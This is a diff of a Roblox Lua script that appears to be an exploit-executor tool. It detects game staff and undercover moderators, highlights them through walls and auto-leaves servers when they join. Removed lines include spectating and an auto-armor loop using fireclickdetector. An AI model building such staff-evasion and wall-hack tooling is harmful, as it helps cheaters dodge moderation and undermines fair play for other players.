+    box.TextXAlignment = Enum.TextXAlignment.Center
+    box.PlaceholderText = tostring(initialValue)
+    Instance.new("UICorner", box).CornerRadius = UDim.new(0, 8)
+
+    local function commit()
+        local value = tonumber(box.Text)
+        if not value then
+            box.Text = tostring(initialValue)
+            return
+        end
+        value = math.clamp(value, minValue, maxValue)
+        box.Text = tostring(value)
+        initialValue = value
+        callback(value)
+    end
+
+    box:GetPropertyChangedSignal("Text"):Connect(function()
+        local value = tonumber(box.Text)
+        if value then
+            callback(math.clamp(value, minValue, maxValue))
+        end
+    end)
+    box.FocusLost:Connect(commit)
+end
+
 -- ======================================================== --
---  INFO / UPDATES PAGE
---  To customise what appears on this page, edit the three
---  tables directly below.  Each string = one line of text.
---  "+" prefix = newly added feature  (put these at the TOP)
---  "-" prefix = existing note / known issue
+local function keyFromSetting(name, defaultName)
+    local savedName = loadSetting(name, defaultName)
+    if not savedName or savedName == "" then return nil end
+    local ok, key = pcall(function() return Enum.KeyCode[savedName] end)
+    if ok and key and key ~= Enum.KeyCode.Unknown then return key end
+    return nil
+end
+menuKey = keyFromSetting("MenuKey", "T") or Enum.KeyCode.T
+staffCheckKey = config.StaffSaveSettings and keyFromSetting("StaffCheckKey", nil) or nil
+theme.ToggleKey = menuKey
+local function menuKeyConflict(key)
+    if key == staffCheckKey then return false, "That key is already used for the active staff check" end
+    return true
+end
+local function staffCheckKeyConflict(key)
+    if key == theme.ToggleKey then return false, "That key is already used to toggle Staff Alert" end
+    return true
+end
+
+--  INFORMATION PAGE
+--  To customise what appears on this page, edit INFO_LINES below.
+--  Each string is one line of text.
 -- ======================================================== --
 
 -- xx INFORMATION
--- Add any extra important notes or announcements here.
 local INFO_LINES = {
-    "• Free Version: Staff monitoring, alerts, ESP, and F1 staff checks",
-    "• PREMIUM VERSION: Adds Fling, Target / Extra, Auto Armor and more",
-    "• When group gets updated again, be aware that most staff will not be in it yet.",
-    "• This will mean it's not as accurate yet, use at own risk.",
+    "• Staff alert is up to date",
+    "• Free access edition",
     "",
-    "• Staff Group = official staff with perms",
-    "• Undercover = Staff with perms who are no in the group (high chance it has perms)",
-    "• Possible staff group = groups who may give people staff perms besides the official (low chance it has perms)",
+    "• Staff Group = official staff with permissions",
+    "• Undercover = staff with permissions who are not currently in the official group",
+    "• Possible Staff = groups that may grant staff permissions (lower confidence)",
+    "• Group data can lag after a staff update; use the results with care.",
 }
 
--- xx UPDATES
--- New items (+) should go at the TOP of this list.
-local UPDATE_LINES = {
-    "+ Free edition includes staff monitoring, alerts, ESP, and F1 checks",
-}
-
--- xx EXPERIMENTAL FUNCTIONS
--- Describe experimental / beta features here.
-local EXPERIMENTAL_LINES = {
-    "! Premium-only tools are not included in this free edition.",
-}
-
--- Builds one labelled section.  Edit the tables above, not this function.
+-- Builds the information card. Edit INFO_LINES above, not this function.
 local function makeInfoSection(title, color, lines, yStart, parent)
     local hdr = Instance.new("TextLabel", parent)
     hdr.BackgroundTransparency = 1
@@ -873,198 +2948,176 @@ infoPage.ScrollBarThickness = 3
 local _infoY = 0
 --xx Subtitles Info/update
 _infoY = makeInfoSection("INFORMATION",            theme.AccentSecondary, INFO_LINES,         _infoY, infoPage)
-_infoY = makeInfoSection("EXPERIMENTAL FUNCTIONS", theme.PossibleStaff,   EXPERIMENTAL_LINES,  _infoY, infoPage)
-_infoY = makeInfoSection("UPDATES",                theme.Success,         UPDATE_LINES,        _infoY, infoPage)
 infoPage.CanvasSize = UDim2.new(0, 0, 0, _infoY + 10)
--- Populate Target Page
-local tt = Instance.new("TextLabel", targetPage)
-tt.BackgroundTransparency = 1
-tt.Size = UDim2.new(1, 0, 0, 30)
-tt.Font = Enum.Font.GothamBold
---xx Subtitle Target/Extra
-tt.Text = "PLAYER TARGETING"
-tt.TextColor3 = theme.AccentSecondary
-tt.TextSize = 14
-tt.TextXAlignment = Enum.TextXAlignment.Left
+--  PROFILE PAGE
+-- ======================================================== --
+do
+    local profileTitle = Instance.new("TextLabel", profilePage)
+    profileTitle.BackgroundTransparency = 1
+    profileTitle.Size = UDim2.new(1, 0, 0, 28)
+    profileTitle.Font = Enum.Font.GothamBold
+    profileTitle.Text = "PROFILE"
+    profileTitle.TextColor3 = theme.AccentSecondary
+    profileTitle.TextSize = 15
+    profileTitle.TextXAlignment = Enum.TextXAlignment.Left
 
-local input = Instance.new("TextBox", targetPage)
-input.BackgroundColor3 = theme.BackgroundTertiary
-input.Position = UDim2.new(0, 0, 0, 40)
-input.Size = UDim2.new(1, 0, 0, 45)
-input.Font = Enum.Font.GothamBold
-input.PlaceholderText = "TYPE USERNAME OR DISPLAY NAME"
-input.PlaceholderColor3 = Color3.fromRGB(220, 230, 255)
-input.Text = ""
-input.TextColor3 = theme.TextPrimary
-input.TextSize = 16
-input.TextStrokeColor3 = theme.BackgroundPrimary
-input.TextStrokeTransparency = 0.65
-input.TextXAlignment = Enum.TextXAlignment.Center
-input.ClearTextOnFocus = true   -- clears the old name when you click to enter a new one
-Instance.new("UICorner", input).CornerRadius = UDim.new(0, 10)
-local inputStroke = Instance.new("UIStroke", input)
-inputStroke.Color = theme.AccentSecondary
-inputStroke.Thickness = 2
+    local profileCard = Instance.new("Frame", profilePage)
+    profileCard.BackgroundColor3 = theme.BackgroundSecondary
+    profileCard.Position = UDim2.new(0, 0, 0, 38)
+    profileCard.Size = UDim2.new(1, 0, 0, 215)
+    Instance.new("UICorner", profileCard).CornerRadius = UDim.new(0, 14)
+    addGradient(profileCard, Color3.fromRGB(37, 28, 66), Color3.fromRGB(24, 43, 67), 25)
+    local profileCardStroke = Instance.new("UIStroke", profileCard)
+    profileCardStroke.Color = Color3.fromRGB(110, 235, 255)
+    profileCardStroke.Thickness = 1
+    profileCardStroke.Transparency = 0.18
+    addGradient(profileCard, Color3.fromRGB(20, 31, 58), Color3.fromRGB(39, 24, 67), 25)
 
-local suggestion = Instance.new("TextLabel", input)
-suggestion.BackgroundTransparency = 1
-suggestion.Position = UDim2.new(0, 14, 0, 0)
-suggestion.Size = UDim2.new(1, -28, 1, 0)
-suggestion.Font = Enum.Font.GothamMedium
-suggestion.Text = ""
-suggestion.TextColor3 = theme.TextSecondary
-suggestion.TextTransparency = 0.5
-suggestion.TextSize = 15
-suggestion.TextXAlignment = Enum.TextXAlignment.Center
-suggestion.ZIndex = input.ZIndex - 1
+    local profileLargeImage = Instance.new("ImageLabel", profileCard)
+    profileLargeImage.BackgroundColor3 = theme.BackgroundTertiary
+    profileLargeImage.Position = UDim2.new(0, 18, 0.5, -70)
+    profileLargeImage.Size = UDim2.new(0, 140, 0, 140)
+    profileLargeImage.Image = profileImage.Image
+    profileLargeImage.ScaleType = Enum.ScaleType.Crop
+    Instance.new("UICorner", profileLargeImage).CornerRadius = UDim.new(0, 14)
+    local largeImageStroke = Instance.new("UIStroke", profileLargeImage)
+    local ownerProfile = isOwner(localPlayer)
+    largeImageStroke.Color = ownerProfile and theme.Owner or Color3.fromRGB(110, 235, 255)
+    largeImageStroke.Thickness = 2
 
-local function getBestMatch(txt)
-    if txt == "" then return nil end
-    txt = txt:lower()
-    local matches = {}
-    for _, p in ipairs(Players:GetPlayers()) do
-        if p.Name:lower():sub(1, #txt) == txt or p.DisplayName:lower():sub(1, #txt) == txt then
-            table.insert(matches, p)
-        end
-    end
-    if #matches == 0 then return nil end
-    for _, p in ipairs(matches) do
-        if p.Name:lower() == txt or p.DisplayName:lower() == txt then
-            return p
-        end
-    end
-    if #matches > 1 then
-        table.sort(matches, function(a, b) return #a.Name < #b.Name end)
-        if #matches[1].Name == #matches[2].Name then
-            return nil
-        end
-    end
-    return matches[1]
-end
+    local profileName = Instance.new("TextLabel", profileCard)
+    profileName.BackgroundTransparency = 1
+    profileName.Position = UDim2.new(0, 180, 0, 24)
+    profileName.Size = UDim2.new(1, -195, 0, 32)
+    profileName.Font = Enum.Font.GothamBold
+    profileName.Text = localPlayer.DisplayName
+    profileName.TextColor3 = theme.TextPrimary
+    profileName.TextSize = 24
+    profileName.TextXAlignment = Enum.TextXAlignment.Left
+    profileName.TextTruncate = Enum.TextTruncate.AtEnd
 
-input:GetPropertyChangedSignal("Text"):Connect(function()
-    local txt = input.Text
-    local match = getBestMatch(txt)
-    if match and txt ~= "" then
-        local name = match.Name
-        if name:lower():sub(1, #txt) == txt:lower() then
-            suggestion.Text = txt .. name:sub(#txt + 1)
-        else
-            suggestion.Text = txt .. " (" .. match.DisplayName .. ")"
-        end
-    else
-        suggestion.Text = ""
-    end
-end)
+    local profileUser = Instance.new("TextLabel", profileCard)
+    profileUser.BackgroundTransparency = 1
+    profileUser.Position = UDim2.new(0, 180, 0, 63)
+    profileUser.Size = UDim2.new(1, -195, 0, 24)
+    profileUser.Font = Enum.Font.GothamMedium
+    profileUser.Text = "@" .. localPlayer.Name
+    profileUser.TextColor3 = theme.TextSecondary
+    profileUser.TextSize = 15
+    profileUser.TextXAlignment = Enum.TextXAlignment.Left
+    profileUser.TextTruncate = Enum.TextTruncate.AtEnd
 
-input.FocusLost:Connect(function(enter)
-    if enter then
-        local match = getBestMatch(input.Text)
-        if match then
-            input.Text = match.Name
-            suggestion.Text = ""
-        end
-    end
-end)
+    local profileId = Instance.new("TextLabel", profileCard)
+    profileId.BackgroundTransparency = 1
+    profileId.Position = UDim2.new(0, 180, 0, 88)
+    profileId.Size = UDim2.new(1, -195, 0, 22)
+    profileId.Font = Enum.Font.GothamMedium
+    profileId.Text = "User ID: " .. tostring(localPlayer.UserId)
+    profileId.TextColor3 = theme.TextSecondary
+    profileId.TextSize = 14
+    profileId.TextXAlignment = Enum.TextXAlignment.Left
+    profileId.TextTruncate = Enum.TextTruncate.AtEnd
 
-local spectating = false
-local spectateConn
-createToggle("View target", "View the target perspective", 100, false, function(v)
-    if v then
-        local target = getBestMatch(input.Text)
-        if target and target ~= localPlayer then
-            input.Text = target.Name
-            suggestion.Text = ""
-            local function updateCamera()
-                if target.Character and target.Character:FindFirstChildOfClass("Humanoid") then
-                    Workspace.CurrentCamera.CameraSubject = target.Character:FindFirstChildOfClass("Humanoid")
-                end
+    local rankLabel = Instance.new("TextLabel", profileCard)
+    rankLabel.BackgroundTransparency = 1
+    rankLabel.Position = UDim2.new(0, 180, 0, 119)
+    rankLabel.Size = UDim2.new(0, 140, 0, 28)
+    rankLabel.Font = Enum.Font.GothamBold
+    local is01StaffUser = is01Staff(localPlayer)
+    rankLabel.Text = is01StaffUser and "ADMIN  /  01 STAFF" or (ownerProfile and "OVERSEER" or "FREE")
+    rankLabel.TextColor3 = is01StaffUser
+        and theme.OneStaff
+        or (ownerProfile and theme.Owner or theme.TextPrimary)
+    rankLabel.TextSize = 18
+    rankLabel.TextXAlignment = Enum.TextXAlignment.Left
+    if is01StaffUser or ownerProfile then
+        local rankGradient = Instance.new("UIGradient", rankLabel)
+        rankGradient.Color = is01StaffUser
+            and ColorSequence.new({
+                ColorSequenceKeypoint.new(0, Color3.fromRGB(130, 15, 45)),
+                ColorSequenceKeypoint.new(0.38, Color3.fromRGB(235, 55, 90)),
+                ColorSequenceKeypoint.new(0.50, Color3.fromRGB(255, 220, 230)),
+                ColorSequenceKeypoint.new(0.62, Color3.fromRGB(255, 75, 110)),
+                ColorSequenceKeypoint.new(1, Color3.fromRGB(145, 18, 55))
+            })
+            or ColorSequence.new(
+                Color3.fromRGB(225, 225, 25),
+                Color3.fromRGB(255, 255, 235),
+                Color3.fromRGB(245, 245, 65)
+            )
+        rankGradient.Rotation = 0
+        task.spawn(function()
+            while rankLabel.Parent do
+                rankGradient.Offset = Vector2.new(-1, 0)
+                tween(rankGradient, {Offset = Vector2.new(1, 0)}, 2.6, Enum.EasingStyle.Linear)
+                task.wait(3.1)
             end
-            if spectateConn then spectateConn:Disconnect() end
-            spectateConn = RunService.RenderStepped:Connect(function()
-                if spectating and target.Parent then
-                    updateCamera()
-                elseif not target.Parent then
-                    v = false
-                end
-            end)
-            spectating = true
-            notify("SPECTATING", "Viewing " .. target.DisplayName, 3, "success")
-        else
-            spectating = false
-            notify("ERROR", target == localPlayer and "Cannot spectate self" or "Player not found", 3, "warning")
-        end
-    else
-        spectating = false
-        if spectateConn then spectateConn:Disconnect() end
-        if localPlayer.Character and localPlayer.Character:FindFirstChildOfClass("Humanoid") then
-            Workspace.CurrentCamera.CameraSubject = localPlayer.Character:FindFirstChildOfClass("Humanoid")
-        end
+        end)
     end
-end, targetPage)
-
-createToggle("Chat HUD", "Toggle the custom Chat HUD", 160, false, function(v)
-    local TextChatService = game:GetService("TextChatService")
-    pcall(function()
-        StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, v)
-        TextChatService.ChatVersion = Enum.ChatVersion.TextChatService
-        local win = TextChatService:FindFirstChildOfClass("ChatWindowConfiguration") or Instance.new("ChatWindowConfiguration")
-        win.Enabled = v
-        win.TextColor3 = Color3.fromRGB(255, 255, 255)
-        win.TextSize = 16
-        win.Parent = TextChatService
-        local bar = TextChatService:FindFirstChildOfClass("ChatInputBarConfiguration") or Instance.new("ChatInputBarConfiguration")
-        bar.Enabled = v
-        bar.TextColor3 = Color3.fromRGB(255, 255, 255)
-        bar.TextSize = 18
-        bar.Parent = TextChatService
-        if UserInputService.TouchEnabled then
-            win.TextSize = 18
-            bar.TextSize = 18
-        end
-    end)
-end, targetPage)
-
--- Auto Armor
--- While enabled, look for the Medium Armor purchase pad and activate its
--- ClickDetector periodically. The loop is tokenized so rapidly toggling the
--- setting cannot leave multiple purchase loops running at once.
-local autoArmorLoopId = 0
-local function setAutoArmorEnabled(enabled)
-    config.AutoArmorEnabled = enabled
-    autoArmorLoopId = autoArmorLoopId + 1
-    local loopId = autoArmorLoopId
-
-    if not enabled then return end
 
     task.spawn(function()
-        while config.AutoArmorEnabled and autoArmorLoopId == loopId do
-            local buyPads
-            for _, v in ipairs(Workspace:GetDescendants()) do
-                if v.Name == "[Medium Armor]" then
-                    buyPads = v.Parent
-                    break
-                end
-            end
-
-            if buyPads then
-                pcall(function()
-                    local armorPad = buyPads:FindFirstChild("[Medium Armor]")
-                    local detector = armorPad and armorPad:FindFirstChild("ClickDetector")
-                    if detector then
-                        fireclickdetector(detector, 1)
-                    end
-                end)
-            end
-
+        while profileLargeImage.Parent do
+            if profileImage.Image ~= "" then profileLargeImage.Image = profileImage.Image end
             task.wait(1)
         end
     end)
-end
 
-createToggle("Auto Armor", "Automatically activates the Medium Armor pad", 220, config.AutoArmorEnabled, function(v)
-    setAutoArmorEnabled(v)
-end, targetPage)
+    createKeybindControl(
+        "Menu Keybind",
+        "Open or close Staff Alert | click again or left-click elsewhere to clear",
+        269,
+        menuKey,
+        function(key)
+            menuKey = key
+            theme.ToggleKey = key
+            saveSettingWithNotice("MenuKey", key and key.Name or "", "MENU KEY")
+            notify("MENU KEY", key and ("Bound to " .. key.Name) or "Keybind cleared", 3, key and "success" or "warning")
+        end,
+        profilePage,
+        menuKeyConflict,
+        theme.OneStaff
+    )
+
+    createSectionHeader(profilePage, "STAFF DISPLAY", 335, theme.AccentSecondary)
+    createToggle(
+        "01 STAFF TAGS",
+        "Show or hide staff tags",
+        367,
+        config.OneStaffTagsEnabled,
+        function(value)
+            setOneStaffTagsEnabled(value)
+        end,
+        profilePage
+    )
+    createToggle(
+        "01 STAFF ESP",
+        "Show or hide highlights through walls",
+        427,
+        config.OneStaffESPEnabled,
+        function(value)
+            setOneStaffESPEnabled(value)
+        end,
+        profilePage
+    )
+    createSectionHeader(profilePage, "VISUAL EFFECTS", 492, theme.Owner)
+    createToggle(
+        "STAFF EFFECTS",
+        "Show or hide the stomp effects",
+        524,
+        config.OverseerStompEffectsEnabled,
+        function(value)
+            config.OverseerStompEffectsEnabled = value
+            if value then
+                stompEffects.RefreshOverseer()
+            else
+                stompEffects.BindOverseer(nil)
+            end
+        end,
+        profilePage,
+        theme.Owner
+    )
+    profilePage.CanvasSize = UDim2.new(0, 0, 0, 595)
+end
 
 -- Staff Settings
 local l1 = Instance.new("TextLabel", staffPage)
@@ -1072,73 +3125,144 @@ l1.BackgroundTransparency = 1
 l1.Size = UDim2.new(1, 0, 0, 25)
 l1.Font = Enum.Font.GothamBold
 -- xx Subtitle staff alerts
-l1.Text = "STAFF ALERT SETTINGS"
+l1.Text = "STAFF ALERTS"
 l1.TextColor3 = theme.AccentSecondary
 l1.TextSize = 14
 l1.TextXAlignment = Enum.TextXAlignment.Left
 
-createToggle("Staff ESP", "Highlights staff members through walls", 30, config.StaffESPEnabled, function(v)
+createSectionHeader(staffPage, "ALERTS & PROTECTION", 30, theme.AccentSecondary)
+createToggle("Staff ESP", "Highlights staff members through walls", 62, config.StaffESPEnabled, function(v)
     config.StaffESPEnabled = v
+    if config.StaffSaveSettings then
+        saveSettingWithNotice("StaffESPEnabled", v, "STAFF SETTINGS")
+    end
     for _, f in ipairs({state.StaffESPFolder, state.UndercoverESPFolder, state.PossibleESPFolder}) do
-        for _, h in ipairs(f:GetChildren()) do if h:IsA("Highlight") then h.Enabled = v end end
+        for _, h in ipairs(f:GetChildren()) do
+            if h:IsA("Highlight") then
+                h.Enabled = v
+                    and (not h.Name:match("^O1HL_") and not h.Name:match("^OWNERHL_")
+                        or config.OneStaffESPEnabled)
+            end
+        end
     end
 end, staffPage)
 
-createToggle("Staff Notification Alerts", "Receive notification alerts for staff members", 90, config.NotificationsEnabled, function(v)
+createToggle("Staff Notification Alerts", "Receive notification alerts for staff members", 122, config.NotificationsEnabled, function(v)
     config.NotificationsEnabled = v
+    if config.StaffSaveSettings then
+        saveSettingWithNotice("NotificationsEnabled", v, "STAFF SETTINGS")
+    end
 end, staffPage)
 
-createToggle("Staff Sound Alerts", "Receive sound alerts for staff members", 150, config.SoundsEnabled, function(v)
+createToggle("Staff Sound Alerts", "Receive sound alerts for staff members", 182, config.SoundsEnabled, function(v)
     config.SoundsEnabled = v
+    if config.StaffSaveSettings then
+        saveSettingWithNotice("SoundsEnabled", v, "STAFF SETTINGS")
+    end
 end, staffPage)
 
--- F1 / Check Active Staff
--- F1 / Check Active Staff -- always fires regardless of NotificationsEnabled.
--- Results are shown in priority order: Main > Undercover > Possible Staff.
+createToggle("Auto Kick Staff", "Leave automatically when staff or undercover joins", 242,
+    config.AutoKickEnabled, function(v)
+        config.AutoKickEnabled = v
+        if config.StaffSaveSettings then
+            saveSettingWithNotice("AutoKickEnabled", v, "STAFF SETTINGS")
+        end
+        autoKickTriggered = false
+        notify(
+            "AUTO KICK",
+            v and "Enabled — staff and undercover joins will leave this server."
+                or "Disabled",
+            3,
+            v and "success" or "warning"
+        )
+        if v then
+            task.spawn(checkExistingPlayersForAutoKick)
+        end
+    end, staffPage)
+
+createToggle("Save Settings", "Save Staff Alerts settings, including Auto Kick", 302,
+    config.StaffSaveSettings, function(value)
+        config.StaffSaveSettings = value
+        saveSettingWithNotice("StaffSaveSettings", value, "STAFF SETTINGS")
+        if value then
+            saveSettingWithNotice("StaffESPEnabled", config.StaffESPEnabled, "STAFF SETTINGS")
+            saveSettingWithNotice("OneStaffESPEnabled", config.OneStaffESPEnabled, "STAFF SETTINGS")
+            saveSettingWithNotice("NotificationsEnabled", config.NotificationsEnabled, "STAFF SETTINGS")
+            saveSettingWithNotice("SoundsEnabled", config.SoundsEnabled, "STAFF SETTINGS")
+            saveSettingWithNotice("AutoKickEnabled", config.AutoKickEnabled, "STAFF SETTINGS")
+            saveSettingWithNotice("StaffCheckKey", staffCheckKey and staffCheckKey.Name or "", "STAFF SETTINGS")
+        end
+    end, staffPage)
+
+-- Manual / Check Active Staff
+-- The configured staff-check key always fires regardless of NotificationsEnabled.
+-- F1/check-key results intentionally include only VF main-group and undercover staff.
 local function showStaffNotification()
-    local mainLines, undLines, possLines = {}, {}, {}
+    local mainLines, undLines = {}, {}
 
     for _, p in ipairs(Players:GetPlayers()) do
         local mains      = getMainMemberships(p)
-        local possible   = getPossibleMemberships(p)
         local inMain     = #mains > 0
-        local inPossible = #possible > 0
         local isU        = isUndercover(p, inMain)
-        local category   = getPlayerCategory(inMain, isU, inPossible)
-        if not category then continue end
-
-        -- F1 is intentionally compact: names only, so every active player fits.
+        local is01       = is01Staff(p)
         local line = p.DisplayName .. " (@" .. p.Name .. ")"
 
-        if     category == "main"       then table.insert(mainLines, line)
-        elseif category == "undercover" then table.insert(undLines,  line)
-        else                                 table.insert(possLines, line)
+        -- Keep this manual check limited to the two requested VF staff paths.
+        if not is01 and inMain then
+            table.insert(mainLines, line)
+        elseif not is01 and isU then
+            table.insert(undLines, line)
         end
     end
 
     local allLines = {}
     for _, l in ipairs(mainLines) do table.insert(allLines, l) end
     for _, l in ipairs(undLines)  do table.insert(allLines, l) end
-    for _, l in ipairs(possLines) do table.insert(allLines, l) end
 
     if #allLines > 0 then
-        notify("STAFF IN SERVER", table.concat(allLines, "\n"), 8, nil, theme.StaffPresent, true, #allLines)
+        local hasMain = #mainLines > 0
+        local hasUndercover = #undLines > 0
+        local title = hasMain and (hasUndercover and "VF STAFF / UNDERCOVER IN SERVER" or "VF STAFF IN SERVER")
+            or "UNDERCOVER STAFF IN SERVER"
+        notify(
+            title,
+            table.concat(allLines, "\n"),
+            8,
+            nil,
+            hasMain and theme.StaffPresent or theme.Warning,
+            true,
+            #allLines
+        )
     else
-        notify("STAFF IN SERVER", "No staff or undercover players currently in the server.", 4, "success", nil, true)
+        notify("STAFF IN SERVER", "No VF main staff or undercover players currently in the server.", 4, "success", nil, true)
     end
 end
 
-createButton("Check Active Staff", "Lists staff and undercover players currently in server", 210, function()
-    showStaffNotification()
-end, staffPage)
+createKeybindControl(
+    "Check Active Staff Key",
+    "Press this key to list staff and undercover players | default: unbound",
+    372,
+    staffCheckKey,
+    function(key)
+        staffCheckKey = key
+        if config.StaffSaveSettings then
+            saveSettingWithNotice("StaffCheckKey", key and key.Name or "", "STAFF CHECK")
+        end
+        notify("STAFF CHECK", key and ("Bound to " .. key.Name) or "Keybind cleared", 3, key and "success" or "warning")
+    end,
+    staffPage,
+    staffCheckKeyConflict
+)
+staffPage.CanvasSize = UDim2.new(0, 0, 0, 440)
 
 
--- ======================================================== --
 --  STAFF LIST PAGE
 -- ======================================================== --
 
--- ── STAFF LIST: 3 independent scrollable sections ──────────────────────────
--- Each section is a ScrollingFrame taking 1/3 of the page height.
+local refreshStaffList
+(function()
+-- ── STAFF LIST: 4 independent scrollable sections ──────────────────────────
+-- 01 STAFF and the real VF main group sit side by side at the top.
 -- CanvasSize is set explicitly in pixels so scrolling is reliable everywhere.
 local SL_ROW_H   = 56   -- height of each player row in pixels
 local SL_ROW_GAP = 4    -- gap between rows
@@ -1146,11 +3270,13 @@ local SL_STRIDE  = SL_ROW_H + SL_ROW_GAP  -- total pixels per entry
 
 local SL_SECTION_H = 190  -- fixed pixel height for each inner scrolling section
 
-local function slMakeSection(title, color, yOffset)
+local function slMakeSection(title, color, yOffset, xScale, xOffset)
+    xScale = xScale or 0
+    xOffset = xOffset or 0
     local header = Instance.new("TextLabel", staffListPage)
     header.BackgroundTransparency = 1
-    header.Position = UDim2.new(0, 2, 0, yOffset + 2)
-    header.Size     = UDim2.new(1, -4, 0, 20)
+    header.Position = UDim2.new(xScale, xOffset + 2, 0, yOffset + 2)
+    header.Size     = UDim2.new(0.5, -8, 0, 20)
     header.Font     = Enum.Font.GothamBold
     header.Text     = title .. " [0]"
     header.TextColor3 = color
@@ -1160,15 +3286,15 @@ local function slMakeSection(title, color, yOffset)
     local divider = Instance.new("Frame", staffListPage)
     divider.BackgroundColor3    = color
     divider.BackgroundTransparency = 0.5
-    divider.Position = UDim2.new(0, 0, 0, yOffset + 24)
-    divider.Size     = UDim2.new(1, 0, 0, 1)
+    divider.Position = UDim2.new(xScale, xOffset, 0, yOffset + 24)
+    divider.Size     = UDim2.new(0.5, -4, 0, 1)
 
     -- ScrollingFrame with fixed pixel height for reliable scrolling
     local sf = Instance.new("ScrollingFrame", staffListPage)
     sf.BackgroundColor3   = theme.BackgroundSecondary
     sf.BorderSizePixel    = 0
-    sf.Position           = UDim2.new(0, 0, 0, yOffset + 28)
-    sf.Size               = UDim2.new(1, 0, 0, SL_SECTION_H)
+    sf.Position           = UDim2.new(xScale, xOffset, 0, yOffset + 28)
+    sf.Size               = UDim2.new(0.5, -4, 0, SL_SECTION_H)
     sf.CanvasSize         = UDim2.new(1, 0, 0, 0)   -- starts empty; set explicitly on populate
     sf.ScrollingEnabled   = true
     sf.ScrollingDirection = Enum.ScrollingDirection.Y
@@ -1196,9 +3322,10 @@ local function slMakeSection(title, color, yOffset)
 end
 
 local SL_SECTION_STRIDE = 228  -- pixels per section block (28 header + 190 sf + 10 gap)
-local slMainSF, slMainEmpty, slMainHdr = slMakeSection("— STAFF GROUP  (Main Group)", theme.Success,       0)
-local slUndSF,  slUndEmpty,  slUndHdr  = slMakeSection("— UNDERCOVER",          theme.Warning,       SL_SECTION_STRIDE)
-local slPossSF, slPossEmpty, slPossHdr = slMakeSection("— POSSIBLE STAFF",      theme.PossibleStaff, SL_SECTION_STRIDE * 2)
+local slOneSF, slOneEmpty, slOneHdr = slMakeSection("— 01 STAFF", theme.OneStaff, 0, 0, 0)
+local slMainSF, slMainEmpty, slMainHdr = slMakeSection("— VF STAFF GROUP  (MAIN)", theme.Success, 0, 0.5, 4)
+local slUndSF,  slUndEmpty,  slUndHdr  = slMakeSection("— UNDERCOVER", theme.Warning, SL_SECTION_STRIDE, 0, 0)
+local slPossSF, slPossEmpty, slPossHdr = slMakeSection("— POSSIBLE STAFF", theme.PossibleStaff, SL_SECTION_STRIDE, 0.5, 4)
 
 -- Add one player row at the given index inside a ScrollingFrame
 local function slAddRow(sf, idx, nameText, detailText, color)
@@ -1232,6 +3359,29 @@ local function slAddRow(sf, idx, nameText, detailText, color)
     nameLbl.TextSize = 15
     nameLbl.TextXAlignment = Enum.TextXAlignment.Left
     nameLbl.TextTruncate   = Enum.TextTruncate.AtEnd
+    if color == theme.OneStaff or color == theme.Owner then
+        local flint = Instance.new("UIGradient", nameLbl)
+        flint.Color = color == theme.Owner
+            and ColorSequence.new({
+                ColorSequenceKeypoint.new(0, Color3.fromRGB(190, 150, 24)),
+                ColorSequenceKeypoint.new(0.42, Color3.fromRGB(255, 226, 82)),
+                ColorSequenceKeypoint.new(0.52, Color3.fromRGB(255, 255, 225)),
+                ColorSequenceKeypoint.new(1, Color3.fromRGB(205, 175, 35)),
+            })
+            or ColorSequence.new({
+                ColorSequenceKeypoint.new(0, Color3.fromRGB(125, 15, 45)),
+                ColorSequenceKeypoint.new(0.42, Color3.fromRGB(235, 55, 90)),
+                ColorSequenceKeypoint.new(0.52, Color3.fromRGB(255, 225, 235)),
+                ColorSequenceKeypoint.new(1, Color3.fromRGB(145, 18, 55)),
+            })
+        task.spawn(function()
+            while nameLbl.Parent do
+                flint.Offset = Vector2.new(-1, 0)
+                tween(flint, {Offset = Vector2.new(1, 0)}, 1.7, Enum.EasingStyle.Linear)
+                task.wait(1.9)
+            end
+        end)
+    end
 
     local detailLbl = Instance.new("TextLabel", row)
     detailLbl.BackgroundTransparency = 1
@@ -1257,7 +3407,7 @@ local function slPopulate(entries, sf, emptyLbl, color, hdr, title)
     slClear(sf)
     emptyLbl.Visible = (#entries == 0)
     for i, e in ipairs(entries) do
-        slAddRow(sf, i, e.display, e.detail, color)
+        slAddRow(sf, i, e.display, e.detail, e.color or color)
     end
     -- Set CanvasSize explicitly so the ScrollingFrame knows how tall the content is
     local totalH = #entries * SL_STRIDE + 12
@@ -1265,59 +3415,13 @@ local function slPopulate(entries, sf, emptyLbl, color, hdr, title)
     hdr.Text = title .. " [" .. #entries .. "]"
 end
 
-local function addEntry(scroll, nameText, detailText, accentColor)
-    -- Count existing rows so we can assign a LayoutOrder
-    local count = 0
-    for _, c in ipairs(scroll:GetChildren()) do if c:IsA("Frame") then count = count + 1 end end
-
-    -- Row is sized; UIListLayout handles vertical stacking automatically
-    local row = Instance.new("Frame", scroll)
-    row.BackgroundColor3 = theme.BackgroundTertiary
-    row.Size         = UDim2.new(1, 0, 0, 50)
-    row.LayoutOrder  = count + 1
-    Instance.new("UICorner", row).CornerRadius = UDim.new(0, 8)
-    local rs = Instance.new("UIStroke", row)
-    rs.Color = accentColor
-    rs.Thickness = 1
-    rs.Transparency = 0.7
-
-    -- Colour accent bar on the left
-    local accent = Instance.new("Frame", row)
-    accent.BackgroundColor3 = accentColor
-    accent.Position = UDim2.new(0, 0, 0, 0)
-    accent.Size     = UDim2.new(0, 3, 1, 0)
-    Instance.new("UICorner", accent).CornerRadius = UDim.new(0, 8)
-
-    local nameLbl = Instance.new("TextLabel", row)
-    nameLbl.BackgroundTransparency = 1
-    nameLbl.Position = UDim2.new(0, 12, 0, 5)
-    nameLbl.Size     = UDim2.new(1, -16, 0, 19)
-    nameLbl.Font     = Enum.Font.GothamBold
-    nameLbl.Text     = nameText
-    nameLbl.TextColor3    = theme.TextPrimary
-    nameLbl.TextSize      = 15
-    nameLbl.TextXAlignment = Enum.TextXAlignment.Left
-    nameLbl.TextTruncate  = Enum.TextTruncate.AtEnd
-
-    local detailLbl = Instance.new("TextLabel", row)
-    detailLbl.BackgroundTransparency = 1
-    detailLbl.Position = UDim2.new(0, 12, 0, 27)
-    detailLbl.Size     = UDim2.new(1, -16, 0, 17)
-    detailLbl.Font     = Enum.Font.Gotham
-    detailLbl.Text     = detailText
-    detailLbl.TextColor3    = accentColor
-    detailLbl.TextSize      = 13
-    detailLbl.TextXAlignment = Enum.TextXAlignment.Left
-    detailLbl.TextTruncate  = Enum.TextTruncate.AtEnd
-
-    return count + 1
-end
-
-local function refreshStaffList()
+refreshStaffList = function()
+    slClear(slOneSF)
     slClear(slMainSF)
     slClear(slUndSF)
     slClear(slPossSF)
 
